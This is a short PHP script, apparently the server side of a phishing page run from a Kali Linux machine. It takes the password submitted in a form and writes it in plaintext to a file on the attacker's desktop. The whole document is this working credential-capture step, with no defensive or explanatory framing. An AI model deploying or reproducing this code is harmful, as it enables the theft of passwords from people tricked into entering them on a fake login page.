<?php

$myfile = fopen("/home/kali/Desktop/password.txt", "w") or die("Unable to open file!");


// write password from form to file
fwrite($myfile, $_POST['password']);


// close file
fclose($myfile);
?>